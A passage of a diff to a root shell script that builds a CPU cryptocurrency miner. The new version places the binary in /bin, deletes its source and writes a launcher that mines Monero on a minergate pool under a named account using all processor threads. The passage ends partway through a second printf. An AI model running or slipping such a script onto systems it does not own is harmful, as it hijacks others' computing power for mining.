@@ -1,20 +1,14 @@
 apt-get update;
 apt-get install -y automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev;
-sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3));
-git clone https://github.com/tpruvot/cpuminer-multi /root/cpuminer-multi;
-cd /root/cpuminer-multi/;
-./autogen.sh;
-if [ ! "0" = `cat /proc/cpuinfo | grep -c avx2` ];
-then
-    CFLAGS="-O2 -mavx2" ./configure --with-crypto --with-curl
-elif [ ! "0" = `cat /proc/cpuinfo | grep -c avx` ];
-then
-    CFLAGS="-O2 -mavx" ./configure --with-crypto --with-curl
-else
-    CFLAGS="-march=native" ./configure --with-crypto --with-curl
-fi
-make clean && make;
-printf "#!/bin/sh\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
+git clone https://github.com/JayDDee/cpuminer-opt /var/tmp/cpuminer-src;
+cd /var/tmp/cpuminer-src;
+chmod +x ./build.sh;
+./build.sh;
+cp /var/tmp/cpuminer-src/cpuminer /bin;
+rm -rf /var/tmp/cpuminer-src;
+
+chmod +x /bin/cpuminer;
+printf "#!/bin/sh\ncpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
 printf '
 #!/bin/sh
 
